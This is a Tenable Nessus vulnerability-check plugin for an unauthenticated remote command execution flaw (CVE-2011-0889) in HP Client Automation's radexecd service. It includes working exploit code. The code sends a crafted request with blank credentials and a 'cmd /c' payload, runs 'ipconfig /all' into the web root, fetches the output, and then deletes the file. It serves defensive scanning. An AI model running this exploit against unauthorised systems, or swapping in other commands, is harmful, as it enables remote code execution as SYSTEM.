#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(56166);
 script_version("$Revision: 1.5 $");
 script_cvs_date("$Date: 2015/09/24 21:08:39 $");

 script_cve_id("CVE-2011-0889");
 script_bugtraq_id(46862);
 script_osvdb_id(71179);

 script_name(english:"HP Client Automation radexecd.exe Remote Command Execution");
 script_summary(english:"Checks for a command-execution vulnerability in HP Client Automation");

 script_set_attribute(attribute:"synopsis", value:
"The HP Client Automation service on the remote port can run commands
on the local system without authentication.");

 script_set_attribute(attribute:"description", value:
"The HP Client Automation service on the remote port is affected by a
command execution vulnerability.  The vulnerability allows remote
attackers to execute arbitrary code on vulnerable installations of HP
Client Automation.  Authentication is not required to exploit the
vulnerability.

The flaw exists within the radexecd.exe component.  When handling a
remote execute request, the process does not properly authenticate the
user issuing the request.  Utilities are stored in the 'secure' path
that could allow an attacker to re-execute an arbitrary executable.  A
remote attacker can exploit this vulnerability to execute arbitrary
code under the context of the SYSTEM user.");

 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bd4f4171");
 script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-11-105/");
 script_set_attribute(attribute:"solution", value: "See the advisory for a possible solution. Alternatively, block access to the port.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"vuln_publication_date", value:"2011/03/14");
 script_set_attribute(attribute:"patch_publication_date", value:"2011/03/14");
 script_set_attribute(attribute:"plugin_publication_date", value:"2011/09/12");

 script_set_attribute(attribute:"plugin_type", value:"remote"); 
 script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:client_automation_enterprise");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"Windows");
 script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

 script_dependencies('ovcm_notify_daemon_detect.nasl', 'hp_client_automation_satellite_detect.nasl');
 script_require_keys('Services/radexecd', 'www/hp_client_automation_satellite');
 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

function radexec_run(port, command)
{
  local_var s;

  # Open the connection to radexecd
  s = open_sock_tcp(port);
  if(!s) exit(1, "Can't open socket on port "+port+".");

  # Send the request
  send(socket:s, data:
            '12345\0' + # connect-back port number - doesn't matter
            '\0' +      # username - not necessary
            '\0' +      # password - not necessary
            'runasuser.exe ' + # the built-in service to call
            'cmd /c "' + command + '"\0');

  # One byte should be returned, and we don't care what it is
  recv(socket:s, length:1, min:1);

  close(s);
}

# The port for the execution service
port_radexec = get_service(svc:'radexecd', default:3465, exit_on_fail:TRUE);

# The port where we retrieve the file afterwards
port_httpd = get_http_port(default:3466);

# Filter out ports that aren't running HPCA Satellite
get_install_from_kb(appname:"hp_client_automation_satellite", port:port_httpd, exit_on_fail:TRUE);

# The command to run for the exploit
command = 'ipconfig /all';
output_str = 'Windows IP Configuration';

# Pick a unique filename so we can properly validate the 'attack'
filename = SCRIPT_NAME + '_' + rand() + '.txt';

# Run the command that creates the file
radexec_run(port:port_radexec, command:command + ' > \\progra~1\\hewlet~1\\HPCA\\ApacheServer\\htdocs\\' + filename);

# Give the command a couple seconds to run
sleep(5);

# Grab the file
r = http_send_recv3(method:"GET", item:"/" + filename, port:port_httpd, exit_on_fail:TRUE);
output = r[2];

# Delete the file (we do this even if it didn't appear to succeed, because it's
# possible that it succeeded but we couldn't access it via Web or something
radexec_run(port:port_radexec, command:'del \\progra~1\\hewlet~1\\HPCA\\ApacheServer\\htdocs\\' + filename);

# Check if the output contains the expected string
if(output && (output_str >< output))
{
  if(report_verbosity > 0)
  {
    report = '\n' +
          'Nessus was able to exploit the vulnerability to execute the command\n' +
          '\'' + command + '\' on the remote host, which produced the following output :\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        chomp(output) + '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    security_hole(port:port_radexec, extra:report);
  }
  else security_hole(port_radexec);
  exit(0);
}
else exit(0, "The server on port "+port_radexec+" does not appear to be affected.");
